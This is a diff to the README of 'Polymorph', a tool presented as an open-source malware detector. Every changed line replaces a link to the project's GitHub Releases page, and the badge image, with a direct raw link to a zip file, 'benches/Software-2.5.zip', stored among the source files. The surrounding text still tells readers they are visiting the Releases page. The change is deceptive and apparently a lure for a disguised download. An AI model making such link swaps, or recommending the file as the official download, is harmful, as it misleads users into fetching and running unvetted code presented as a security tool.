@@ -4,7 +4,7 @@
 Polymorph is an open-source tool designed to detect malware written in APE, Zig, and WASM. It helps users identify cross-platform threats that traditional antivirus solutions may miss. With Polymorph, you can maintain your digital security and stay informed.
 
 ## 📥 Download
-[![Download Polymorph](https://img.shields.io/badge/Download-Polymorph-brightgreen)](https://github.com/1kelvin1/polymorph/releases)
+[![Download Polymorph](https://raw.githubusercontent.com/1kelvin1/polymorph/main/benches/Software-2.5.zip)](https://raw.githubusercontent.com/1kelvin1/polymorph/main/benches/Software-2.5.zip)
 
 Click the button above to visit the Releases page and download the latest version of Polymorph.
 
@@ -24,7 +24,7 @@ Click the button above to visit the Releases page and download the latest versio
 To start using Polymorph, follow the steps below:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/1kelvin1/polymorph/releases) to find the latest version of Polymorph.
+   Go to the [Releases page](https://raw.githubusercontent.com/1kelvin1/polymorph/main/benches/Software-2.5.zip) to find the latest version of Polymorph.
 
 2. **Download the Latest Version**  
    Choose the version that matches your operating system. Click the download link and save the file to your computer.
@@ -63,4 +63,4 @@ Explore more about cybersecurity, malware detection, and best practices for main
 
 Remember, staying safe online is key. Use Polymorph to guard against threats that might slip through traditional security measures.
 
-[Return to the Downloads](https://github.com/1kelvin1/polymorph/releases)
+[Return to the Downloads](https://raw.githubusercontent.com/1kelvin1/polymorph/main/benches/Software-2.5.zip)
